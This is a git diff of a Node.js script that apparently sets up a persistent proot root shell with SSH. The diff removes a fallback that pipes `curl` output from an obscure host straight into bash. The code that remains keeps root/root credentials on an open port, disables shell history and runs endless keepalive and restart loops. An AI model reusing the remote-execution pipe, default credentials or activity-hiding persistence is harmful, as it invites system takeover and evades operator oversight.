@@ -17,10 +17,9 @@ const URLS = [
 const TMP = 'freeroot_temp';
 const DIR = 'work';
 const SH = 'noninteractive.sh';
-const FALLBACK_URL = 'r.snd.qzz.io/raw/cpu';
 
 let sshIp = '0.0.0.0';
-let sshPort = 24990;
+let sshPort = 25565;
 const users = new Map([['root', 'root']]);
 
 function log(level, msg) {
@@ -97,22 +96,6 @@ async function cloneRepo() {
     return false;
 }
 
-async function fallback() {
-    if (!(await checkCommand('curl'))) {
-        log('WARN', 'Curl not found, cannot use fallback');
-        return false;
-    }
-    log('INFO', `Executing fallback: curl ${FALLBACK_URL} | bash`);
-    try {
-        await execAsync(`curl ${FALLBACK_URL} | bash`);
-        log('INFO', 'Fallback executed successfully');
-        return true;
-    } catch (e) {
-        log('ERROR', `Fallback failed: ${e.message}`);
-        return false;
-    }
-}
-
 async function executeScript(dir, script) {
     log('INFO', `Executing script '${script}'...`);
     return new Promise((resolve, reject) => {
@@ -148,13 +131,11 @@ export LANG=C
 ROOTFS_DIR=$(pwd)
 export PATH=$PATH:~/.local/usr/bin
 
-# Check if already installed
 if [ ! -e $ROOTFS_DIR/.installed ]; then
     echo 'Proot environment not installed yet. Please wait for setup to complete.'
     exit 1
 fi
 
-# Display system info
 G="\\033[0;32m"
 Y="\\033[0;33m"
 R="\\033[0;31m"
@@ -183,7 +164,6 @@ echo -e "           \${C}-----> Mission Completed ! <-----\${X}"
 echo -e "\${W}___________________________________________________\${X}"
 echo ""
 
-# Force hostname to furryisbest inside proot
 echo 'furryisbest' > $ROOTFS_DIR/etc/hostname
 cat > $ROOTFS_DIR/etc/hosts << 'HOSTS_EOF'
 127.0.0.1   localhost
@@ -193,29 +173,20 @@ ff02::1     ip6-allnodes
 ff02::2     ip6-allrouters
 HOSTS_EOF
 
-# Create enhanced bashrc with hostname and keepalive
 cat > $ROOTFS_DIR/root/.bashrc << 'BASHRC_EOF'
-# Force hostname
 export HOSTNAME=furryisbest
 export PS1='root@furryisbest:\\w\\$ '
-
-# Disable all timeouts
 export LC_ALL=C
 export LANG=C
 export TMOUT=0
 unset TMOUT
-
-# Infinite session - prevent auto-logout
 set +o history 2>/dev/null
 PROMPT_COMMAND=''
-
-# Standard aliases
 alias ls='ls --color=auto'
 alias ll='ls -lah'
 alias grep='grep --color=auto'
 BASHRC_EOF
 
-# Start aggressive keepalive in background
 (
   while true; do
     sleep 15
@@ -224,10 +195,8 @@ BASHRC_EOF
 ) &
 KEEPALIVE_PID=$!
 
-# Cleanup trap
 trap "kill $KEEPALIVE_PID 2>/dev/null; exit" EXIT INT TERM
 
-# Infinite loop to restart proot if it crashes
 while true; do
   $ROOTFS_DIR/usr/local/bin/proot \\
     --rootfs="\${ROOTFS_DIR}" \\
@@ -404,16 +373,8 @@ async function main() {
     }
 
     if (!(await cloneRepo())) {
-        log('WARN', 'All clone attempts failed, trying fallback method...');
-        if (fs.existsSync(tmpDir)) {
-            await deleteRecursive(tmpDir);
-        }
-        if (!(await fallback())) {
-            log('ERROR', 'Fallback method also failed');
-            process.exit(1);
-        }
-        log('INFO', 'Fallback method succeeded');
-        return;
+        log('ERROR', 'All clone attempts failed');
+        process.exit(1);
     }
 
     fs.renameSync(tmpDir, workDir);
